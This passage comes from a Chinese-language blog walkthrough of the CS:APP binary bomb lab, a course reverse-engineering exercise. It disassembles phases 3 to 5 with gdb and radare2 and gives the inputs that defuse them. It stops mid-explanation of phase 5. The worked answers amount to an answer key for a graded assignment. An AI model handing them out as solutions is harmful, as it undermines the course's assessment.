<p>所以可以得出这6个数是等比数列<code>1 2 4 8 16 32</code></p>
<h2 id="Phase3"><a href="#Phase3" class="headerlink" title="Phase3"></a>Phase3</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">bomb`phase_3:</div><div class="line">bomb[0x400f43] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:   subq   $0x18, %rsp</div><div class="line">bomb[0x400f47] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:   leaq   0xc(%rsp), %rcx</div><div class="line">bomb[0x400f4c] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:   leaq   0x8(%rsp), %rdx</div><div class="line">bomb[0x400f51] <span class="tag">&lt;<span class="name">+14</span>&gt;</span>:  movl   $0x4025cf, %esi</div><div class="line">bomb[0x400f56] <span class="tag">&lt;<span class="name">+19</span>&gt;</span>:  movl   $0x0, %eax</div><div class="line">bomb[0x400f5b] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>:  callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf</div><div class="line">bomb[0x400f60] <span class="tag">&lt;<span class="name">+29</span>&gt;</span>:  cmpl   $0x1, %eax</div><div class="line">bomb[0x400f63] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>:  jg     0x400f6a                  ; <span class="tag">&lt;<span class="name">+39</span>&gt;</span></div><div class="line">bomb[0x400f65] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>:  callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400f6a] <span class="tag">&lt;<span class="name">+39</span>&gt;</span>:  cmpl   $0x7, 0x8(%rsp)</div><div class="line">bomb[0x400f6f] <span class="tag">&lt;<span class="name">+44</span>&gt;</span>:  ja     0x400fad                  ; <span class="tag">&lt;<span class="name">+106</span>&gt;</span></div><div class="line">bomb[0x400f71] <span class="tag">&lt;<span class="name">+46</span>&gt;</span>:  movl   0x8(%rsp), %eax</div><div class="line">bomb[0x400f75] <span class="tag">&lt;<span class="name">+50</span>&gt;</span>:  jmpq   *0x402470(,%rax,8)</div><div class="line">bomb[0x400f7c] <span class="tag">&lt;<span class="name">+57</span>&gt;</span>:  movl   $0xcf, %eax</div><div class="line">bomb[0x400f81] <span class="tag">&lt;<span class="name">+62</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400f83] <span class="tag">&lt;<span class="name">+64</span>&gt;</span>:  movl   $0x2c3, %eax</div><div class="line">bomb[0x400f88] <span class="tag">&lt;<span class="name">+69</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400f8a] <span class="tag">&lt;<span class="name">+71</span>&gt;</span>:  movl   $0x100, %eax</div><div class="line">bomb[0x400f8f] <span class="tag">&lt;<span class="name">+76</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400f91] <span class="tag">&lt;<span class="name">+78</span>&gt;</span>:  movl   $0x185, %eax</div><div class="line">bomb[0x400f96] <span class="tag">&lt;<span class="name">+83</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400f98] <span class="tag">&lt;<span class="name">+85</span>&gt;</span>:  movl   $0xce, %eax</div><div class="line">bomb[0x400f9d] <span class="tag">&lt;<span class="name">+90</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400f9f] <span class="tag">&lt;<span class="name">+92</span>&gt;</span>:  movl   $0x2aa, %eax</div><div class="line">bomb[0x400fa4] <span class="tag">&lt;<span class="name">+97</span>&gt;</span>:  jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400fa6] <span class="tag">&lt;<span class="name">+99</span>&gt;</span>:  movl   $0x147, %eax</div><div class="line">bomb[0x400fab] <span class="tag">&lt;<span class="name">+104</span>&gt;</span>: jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400fad] <span class="tag">&lt;<span class="name">+106</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400fb2] <span class="tag">&lt;<span class="name">+111</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x400fb7] <span class="tag">&lt;<span class="name">+116</span>&gt;</span>: jmp    0x400fbe                  ; <span class="tag">&lt;<span class="name">+123</span>&gt;</span></div><div class="line">bomb[0x400fb9] <span class="tag">&lt;<span class="name">+118</span>&gt;</span>: movl   $0x137, %eax</div><div class="line">bomb[0x400fbe] <span class="tag">&lt;<span class="name">+123</span>&gt;</span>: cmpl   0xc(%rsp), %eax</div><div class="line">bomb[0x400fc2] <span class="tag">&lt;<span class="name">+127</span>&gt;</span>: je     0x400fc9                  ; <span class="tag">&lt;<span class="name">+134</span>&gt;</span></div><div class="line">bomb[0x400fc4] <span class="tag">&lt;<span class="name">+129</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400fc9] <span class="tag">&lt;<span class="name">+134</span>&gt;</span>: addq   $0x18, %rsp</div><div class="line">bomb[0x400fcd] <span class="tag">&lt;<span class="name">+138</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>代码还挺长。</p>
<p>同样，根据<code>bomb[0x400f51] &lt;+14&gt;:  movl   $0x4025cf, %esi</code>可以得到<code>%d %d</code>这个格式，代表要输入两个整数。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bomb[0x400f47] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:   leaq   0xc(%rsp), %rcx</div><div class="line">bomb[0x400f4c] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:   leaq   0x8(%rsp), %rdx</div></pre></td></tr></table></figure>
<p>这两行代表了两个数存的位置。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bomb[0x400f6a] <span class="tag">&lt;<span class="name">+39</span>&gt;</span>:  cmpl   $0x7, 0x8(%rsp)</div><div class="line">bomb[0x400f6f] <span class="tag">&lt;<span class="name">+44</span>&gt;</span>:  ja     0x400fad                  ; <span class="tag">&lt;<span class="name">+106</span>&gt;</span></div></pre></td></tr></table></figure>
<p>由这两行，可知第一个数要不能大于7,<code>ja</code>是<code>unsigned &gt;</code>，所以第一个数还要是正数。</p>
<p>关键的一行是这个<code>bomb[0x400f75] &lt;+50&gt;:  jmpq   *0x402470(,%rax,8)</code>,这是一个switch跳转语句，跳转到<code>0x402470+ %rax * 8</code>的位置。使用<code>p/x</code>来确定跳转的目的地址。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">(gdb) p/x *(0x402470)</div><div class="line">$1 = 0x400f7c</div><div class="line">(gdb) p/x *(0x402470+8)</div><div class="line">$2 = 0x400fb9</div><div class="line">(gdb) p/x *(0x402470+16)</div><div class="line">$3 = 0x400f83</div><div class="line">(gdb) p/x *(0x402470+24)</div><div class="line">$4 = 0x400f8a</div><div class="line">(gdb) p/x *(0x402470+32)</div><div class="line">$5 = 0x400f91</div><div class="line">(gdb) p/x *(0x402470+40)</div><div class="line">$6 = 0x400f98</div><div class="line">(gdb) p/x *(0x402470+48)</div><div class="line">$7 = 0x400f9f</div><div class="line">(gdb) p/x *(0x402470+56)</div><div class="line">$8 = 0x400fa6</div></pre></td></tr></table></figure>
<p>通过这个跳转表，可得得到8个解</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0 207</div><div class="line">1 311</div><div class="line">2 707</div><div class="line">3 256</div><div class="line">4 389</div><div class="line">5 206</div><div class="line">6 682</div><div class="line">7 327</div></pre></td></tr></table></figure>
<h2 id="Phase4"><a href="#Phase4" class="headerlink" title="Phase4"></a>Phase4</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">bomb`phase_4:</div><div class="line">bomb[0x40100c] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  subq   $0x18, %rsp</div><div class="line">bomb[0x401010] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:  leaq   0xc(%rsp), %rcx</div><div class="line">bomb[0x401015] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:  leaq   0x8(%rsp), %rdx</div><div class="line">bomb[0x40101a] <span class="tag">&lt;<span class="name">+14</span>&gt;</span>: movl   $0x4025cf, %esi</div><div class="line">bomb[0x40101f] <span class="tag">&lt;<span class="name">+19</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x401024] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf</div><div class="line">bomb[0x401029] <span class="tag">&lt;<span class="name">+29</span>&gt;</span>: cmpl   $0x2, %eax</div><div class="line">bomb[0x40102c] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>: jne    0x401035                  ; <span class="tag">&lt;<span class="name">+41</span>&gt;</span></div><div class="line">bomb[0x40102e] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>: cmpl   $0xe, 0x8(%rsp)</div><div class="line">bomb[0x401033] <span class="tag">&lt;<span class="name">+39</span>&gt;</span>: jbe    0x40103a                  ; <span class="tag">&lt;<span class="name">+46</span>&gt;</span></div><div class="line">bomb[0x401035] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x40103a] <span class="tag">&lt;<span class="name">+46</span>&gt;</span>: movl   $0xe, %edx</div><div class="line">bomb[0x40103f] <span class="tag">&lt;<span class="name">+51</span>&gt;</span>: movl   $0x0, %esi</div><div class="line">bomb[0x401044] <span class="tag">&lt;<span class="name">+56</span>&gt;</span>: movl   0x8(%rsp), %edi</div><div class="line">bomb[0x401048] <span class="tag">&lt;<span class="name">+60</span>&gt;</span>: callq  0x400fce                  ; func4</div><div class="line">bomb[0x40104d] <span class="tag">&lt;<span class="name">+65</span>&gt;</span>: testl  %eax, %eax</div><div class="line">bomb[0x40104f] <span class="tag">&lt;<span class="name">+67</span>&gt;</span>: jne    0x401058                  ; <span class="tag">&lt;<span class="name">+76</span>&gt;</span></div><div class="line">bomb[0x401051] <span class="tag">&lt;<span class="name">+69</span>&gt;</span>: cmpl   $0x0, 0xc(%rsp)</div><div class="line">bomb[0x401056] <span class="tag">&lt;<span class="name">+74</span>&gt;</span>: je     0x40105d                  ; <span class="tag">&lt;<span class="name">+81</span>&gt;</span></div><div class="line">bomb[0x401058] <span class="tag">&lt;<span class="name">+76</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x40105d] <span class="tag">&lt;<span class="name">+81</span>&gt;</span>: addq   $0x18, %rsp</div><div class="line">bomb[0x401061] <span class="tag">&lt;<span class="name">+85</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>同样的方式，可以确定第一个整数小于等于14，第二个数为0。</p>
<p>第一个数具体值，需要执行func4。</p>
<p>所以func4的代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">bomb`func4:</div><div class="line">bomb[0x400fce] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  subq   $0x8, %rsp</div><div class="line">bomb[0x400fd2] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:  movl   %edx, %eax</div><div class="line">bomb[0x400fd4] <span class="tag">&lt;<span class="name">+6</span>&gt;</span>:  subl   %esi, %eax</div><div class="line">bomb[0x400fd6] <span class="tag">&lt;<span class="name">+8</span>&gt;</span>:  movl   %eax, %ecx</div><div class="line">bomb[0x400fd8] <span class="tag">&lt;<span class="name">+10</span>&gt;</span>: shrl   $0x1f, %ecx</div><div class="line">bomb[0x400fdb] <span class="tag">&lt;<span class="name">+13</span>&gt;</span>: addl   %ecx, %eax</div><div class="line">bomb[0x400fdd] <span class="tag">&lt;<span class="name">+15</span>&gt;</span>: sarl   %eax</div><div class="line">bomb[0x400fdf] <span class="tag">&lt;<span class="name">+17</span>&gt;</span>: leal   (%rax,%rsi), %ecx</div><div class="line">bomb[0x400fe2] <span class="tag">&lt;<span class="name">+20</span>&gt;</span>: cmpl   %edi, %ecx</div><div class="line">bomb[0x400fe4] <span class="tag">&lt;<span class="name">+22</span>&gt;</span>: jle    0x400ff2                  ; <span class="tag">&lt;<span class="name">+36</span>&gt;</span></div><div class="line">bomb[0x400fe6] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>: leal   -0x1(%rcx), %edx</div><div class="line">bomb[0x400fe9] <span class="tag">&lt;<span class="name">+27</span>&gt;</span>: callq  0x400fce                  ; <span class="tag">&lt;<span class="name">+0</span>&gt;</span></div><div class="line">bomb[0x400fee] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>: addl   %eax, %eax</div><div class="line">bomb[0x400ff0] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>: jmp    0x401007                  ; <span class="tag">&lt;<span class="name">+57</span>&gt;</span></div><div class="line">bomb[0x400ff2] <span class="tag">&lt;<span class="name">+36</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x400ff7] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: cmpl   %edi, %ecx</div><div class="line">bomb[0x400ff9] <span class="tag">&lt;<span class="name">+43</span>&gt;</span>: jge    0x401007                  ; <span class="tag">&lt;<span class="name">+57</span>&gt;</span></div><div class="line">bomb[0x400ffb] <span class="tag">&lt;<span class="name">+45</span>&gt;</span>: leal   0x1(%rcx), %esi</div><div class="line">bomb[0x400ffe] <span class="tag">&lt;<span class="name">+48</span>&gt;</span>: callq  0x400fce                  ; <span class="tag">&lt;<span class="name">+0</span>&gt;</span></div><div class="line">bomb[0x401003] <span class="tag">&lt;<span class="name">+53</span>&gt;</span>: leal   0x1(%rax,%rax), %eax</div><div class="line">bomb[0x401007] <span class="tag">&lt;<span class="name">+57</span>&gt;</span>: addq   $0x8, %rsp</div><div class="line">bomb[0x40100b] <span class="tag">&lt;<span class="name">+61</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>仔细看会发现<code>&lt;+20&gt;</code>和<code>&lt;+41&gt;</code>是一样的，而他们的下一行判断正好相反。注意<code>&lt;+24&gt;</code>和<code>&lt;+45&gt;</code>,以及他们的下一行，都很类似。其实就是递归逼近答案。<br>好吧，随便带入一个0,结果发现正好就正确了。所以输入<code>0 0</code>。倒是测试了一下，发现输入<code>1 0</code>或者<code>3 0</code>或者<code>7 0</code>都正确，果然<code>func4</code>还要细看。只能带入func4慢慢推导，这里就不细写了。</p>
<h2 id="Phase5"><a href="#Phase5" class="headerlink" title="Phase5"></a>Phase5</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">bomb`phase_5:</div><div class="line">bomb[0x401062] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:   pushq  %rbx</div><div class="line">bomb[0x401063] <span class="tag">&lt;<span class="name">+1</span>&gt;</span>:   subq   $0x20, %rsp</div><div class="line">bomb[0x401067] <span class="tag">&lt;<span class="name">+5</span>&gt;</span>:   movq   %rdi, %rbx</div><div class="line">bomb[0x40106a] <span class="tag">&lt;<span class="name">+8</span>&gt;</span>:   movq   %fs:0x28, %rax</div><div class="line">bomb[0x401073] <span class="tag">&lt;<span class="name">+17</span>&gt;</span>:  movq   %rax, 0x18(%rsp)</div><div class="line">bomb[0x401078] <span class="tag">&lt;<span class="name">+22</span>&gt;</span>:  xorl   %eax, %eax</div><div class="line">bomb[0x40107a] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>:  callq  0x40131b                  ; string_length</div><div class="line">bomb[0x40107f] <span class="tag">&lt;<span class="name">+29</span>&gt;</span>:  cmpl   $0x6, %eax</div><div class="line">bomb[0x401082] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>:  je     0x4010d2                  ; <span class="tag">&lt;<span class="name">+112</span>&gt;</span></div><div class="line">bomb[0x401084] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>:  callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x401089] <span class="tag">&lt;<span class="name">+39</span>&gt;</span>:  jmp    0x4010d2                  ; <span class="tag">&lt;<span class="name">+112</span>&gt;</span></div><div class="line">bomb[0x40108b] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>:  movzbl (%rbx,%rax), %ecx</div><div class="line">bomb[0x40108f] <span class="tag">&lt;<span class="name">+45</span>&gt;</span>:  movb   %cl, (%rsp)</div><div class="line">bomb[0x401092] <span class="tag">&lt;<span class="name">+48</span>&gt;</span>:  movq   (%rsp), %rdx</div><div class="line">bomb[0x401096] <span class="tag">&lt;<span class="name">+52</span>&gt;</span>:  andl   $0xf, %edx</div><div class="line">bomb[0x401099] <span class="tag">&lt;<span class="name">+55</span>&gt;</span>:  movzbl 0x4024b0(%rdx), %edx</div><div class="line">bomb[0x4010a0] <span class="tag">&lt;<span class="name">+62</span>&gt;</span>:  movb   %dl, 0x10(%rsp,%rax)</div><div class="line">bomb[0x4010a4] <span class="tag">&lt;<span class="name">+66</span>&gt;</span>:  addq   $0x1, %rax</div><div class="line">bomb[0x4010a8] <span class="tag">&lt;<span class="name">+70</span>&gt;</span>:  cmpq   $0x6, %rax</div><div class="line">bomb[0x4010ac] <span class="tag">&lt;<span class="name">+74</span>&gt;</span>:  jne    0x40108b                  ; <span class="tag">&lt;<span class="name">+41</span>&gt;</span></div><div class="line">bomb[0x4010ae] <span class="tag">&lt;<span class="name">+76</span>&gt;</span>:  movb   $0x0, 0x16(%rsp)</div><div class="line">bomb[0x4010b3] <span class="tag">&lt;<span class="name">+81</span>&gt;</span>:  movl   $0x40245e, %esi</div><div class="line">bomb[0x4010b8] <span class="tag">&lt;<span class="name">+86</span>&gt;</span>:  leaq   0x10(%rsp), %rdi</div><div class="line">bomb[0x4010bd] <span class="tag">&lt;<span class="name">+91</span>&gt;</span>:  callq  0x401338                  ; strings_not_equal</div><div class="line">bomb[0x4010c2] <span class="tag">&lt;<span class="name">+96</span>&gt;</span>:  testl  %eax, %eax</div><div class="line">bomb[0x4010c4] <span class="tag">&lt;<span class="name">+98</span>&gt;</span>:  je     0x4010d9                  ; <span class="tag">&lt;<span class="name">+119</span>&gt;</span></div><div class="line">bomb[0x4010c6] <span class="tag">&lt;<span class="name">+100</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x4010cb] <span class="tag">&lt;<span class="name">+105</span>&gt;</span>: nopl   (%rax,%rax)</div><div class="line">bomb[0x4010d0] <span class="tag">&lt;<span class="name">+110</span>&gt;</span>: jmp    0x4010d9                  ; <span class="tag">&lt;<span class="name">+119</span>&gt;</span></div><div class="line">bomb[0x4010d2] <span class="tag">&lt;<span class="name">+112</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x4010d7] <span class="tag">&lt;<span class="name">+117</span>&gt;</span>: jmp    0x40108b                  ; <span class="tag">&lt;<span class="name">+41</span>&gt;</span></div><div class="line">bomb[0x4010d9] <span class="tag">&lt;<span class="name">+119</span>&gt;</span>: movq   0x18(%rsp), %rax</div><div class="line">bomb[0x4010de] <span class="tag">&lt;<span class="name">+124</span>&gt;</span>: xorq   %fs:0x28, %rax</div><div class="line">bomb[0x4010e7] <span class="tag">&lt;<span class="name">+133</span>&gt;</span>: je     0x4010ee                  ; <span class="tag">&lt;<span class="name">+140</span>&gt;</span></div><div class="line">bomb[0x4010e9] <span class="tag">&lt;<span class="name">+135</span>&gt;</span>: callq  0x400b30                  ; symbol stub for: __stack_chk_fail</div><div class="line">bomb[0x4010ee] <span class="tag">&lt;<span class="name">+140</span>&gt;</span>: addq   $0x20, %rsp</div><div class="line">bomb[0x4010f2] <span class="tag">&lt;<span class="name">+144</span>&gt;</span>: popq   %rbx</div><div class="line">bomb[0x4010f3] <span class="tag">&lt;<span class="name">+145</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>这道题挺让人头大的，只能参考一些资料。这里用到了一个逆向工具——radare2。</p>
<p><code>r2 bomb</code></p>
<p>进入radare2</p>
<p>首先执行<code>aaa</code>来初始化。</p>
<p><code>afl</code>是用来标示函数的， 所以使用<code>afl~phase</code>来寻找反汇编中的phase，得到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[0x00400c90]&gt; afl~phase</div><div class="line">0x004015c4  149  8  sym.phase_defused</div><div class="line">0x00401062  146  9  sym.phase_5</div><div class="line">0x00400f43  139  8  sym.phase_3</div><div class="line">0x00400ee0  28  3  sym.phase_1</div><div class="line">0x004012f6  37  1  sym.invalid_phase</div><div class="line">0x00401242  81  5  sym.secret_phase</div><div class="line">0x0040100c  86  7  sym.phase_4</div><div class="line">0x004010f4  272  26  sym.phase_6</div><div class="line">0x00400efc  71  8  sym.phase_2</div></pre></td></tr></table></figure>
<p>使用<code>seek</code>来选择函数,<code>pdf</code>来打印反汇编的函数:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">[0x00400c90]&gt; s sym.phase_5</div><div class="line">[0x00401062]&gt; pdf</div><div class="line">/ (fcn) sym.phase_5 146</div><div class="line">|           ; CALL XREF from 0x00400eaa (sym.phase_5)</div><div class="line">|           0x00401062      53             push rbx</div><div class="line">|           0x00401063      4883ec20       sub rsp, 0x20</div><div class="line">|           0x00401067      4889fb         mov rbx, rdi</div><div class="line">|           0x0040106a      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x48b8  ; '('</div><div class="line">|           0x00401073      4889442418     mov qword [rsp + 0x18], rax</div><div class="line">|           0x00401078      31c0           xor eax, eax</div><div class="line">|           0x0040107a      e89c020000     call sym.string_length</div><div class="line">|           0x0040107f      83f806         cmp eax, 6</div><div class="line">|       ,=&lt; 0x00401082      744e           je 0x4010d2                </div><div class="line">|       |   0x00401084      e8b1030000     call sym.explode_bomb</div><div class="line">|      ,==&lt; 0x00401089      eb47           jmp 0x4010d2               </div><div class="line">|      ||   ; JMP XREF from 0x004010d7 (sym.phase_5)</div><div class="line">|      ||   ; JMP XREF from 0x004010ac (sym.phase_5)</div><div class="line">|    ..---&gt; 0x0040108b      0fb60c03       movzx ecx, byte [rbx + rax]</div><div class="line">|    ||||   0x0040108f      880c24         mov byte [rsp], cl</div><div class="line">|    ||||   0x00401092      488b1424       mov rdx, qword [rsp]</div><div class="line">|    ||||   0x00401096      83e20f         and edx, 0xf</div><div class="line">|    ||||   0x00401099      0fb692b02440.  movzx edx, byte [rdx + str.maduiersnfotvbylSo_you_think_you_can_stop_the_bomb_with_ctrl_c__do_you_] ; [0x4024b0:1]=109 LEA obj.array.3449 ; "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?" @ 0x4024b0</div><div class="line">|    ||||   0x004010a0      88540410       mov byte [rsp + rax + 0x10], dl</div><div class="line">|    ||||   0x004010a4      4883c001       add rax, 1</div><div class="line">|    ||||   0x004010a8      4883f806       cmp rax, 6</div><div class="line">|    `====&lt; 0x004010ac      75dd           jne 0x40108b               </div><div class="line">|     |||   0x004010ae      c644241600     mov byte [rsp + 0x16], 0</div><div class="line">|     |||   0x004010b3      be5e244000     mov esi, str.flyers         ; "flyers" @ 0x40245e</div><div class="line">|     |||   0x004010b8      488d7c2410     lea rdi, [rsp + 0x10]       ; 0x10 </div><div class="line">|     |||   0x004010bd      e876020000     call sym.strings_not_equal</div><div class="line">|     |||   0x004010c2      85c0           test eax, eax</div><div class="line">|    ,====&lt; 0x004010c4      7413           je 0x4010d9                </div><div class="line">|    ||||   0x004010c6      e86f030000     call sym.explode_bomb</div><div class="line">|    ||||   0x004010cb      0f1f440000     nop dword [rax + rax]</div><div class="line">|   ,=====&lt; 0x004010d0      eb07           jmp 0x4010d9               </div><div class="line">|   |||||   ; JMP XREF from 0x00401089 (sym.phase_5)</div><div class="line">|   |||||   ; JMP XREF from 0x00401082 (sym.phase_5)</div><div class="line">|   |||``-&gt; 0x004010d2      b800000000     mov eax, 0</div><div class="line">|   ||`===&lt; 0x004010d7      ebb2           jmp 0x40108b               </div><div class="line">|   ||      ; JMP XREF from 0x004010d0 (sym.phase_5)</div><div class="line">|   ||      ; JMP XREF from 0x004010c4 (sym.phase_5)</div><div class="line">|   ``----&gt; 0x004010d9      488b442418     mov rax, qword [rsp + 0x18] ; [0x18:8]=0x400c90 section..text</div><div class="line">|           0x004010de      644833042528.  xor rax, qword fs:[0x28]</div><div class="line">|       ,=&lt; 0x004010e7      7405           je 0x4010ee                </div><div class="line">|       |   0x004010e9      e842faffff     call sym.imp.__stack_chk_fail</div><div class="line">|       |   ; JMP XREF from 0x004010e7 (sym.phase_5)</div><div class="line">|       `-&gt; 0x004010ee      4883c420       add rsp, 0x20</div><div class="line">|           0x004010f2      5b             pop rbx</div><div class="line">\           0x004010f3      c3             ret</div><div class="line">[0x00401062]&gt;</div></pre></td></tr></table></figure>
<p>这题要求输入一个长度为6的字符串，经过一定的变换要得到<code>0x40245e</code>指向的字符串<code>flyers</code>。通过上述的代码，会敏感的发现待转换的字符串在<code>obj.array.3449</code>中，使用如下代码来找到偏移量<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[0x00401062]&gt; px 16@obj.array.3449</div><div class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</div><div class="line">0x004024b0  6d61 6475 6965 7273 6e66 6f74 7662 796c  maduiersnfotvbyl</div></pre></td></tr></table></figure></p>
<p>上面的一个偏移量对应下面的2个字符。</p>
<p>下面将flyers转化为十六进制ascii</p>
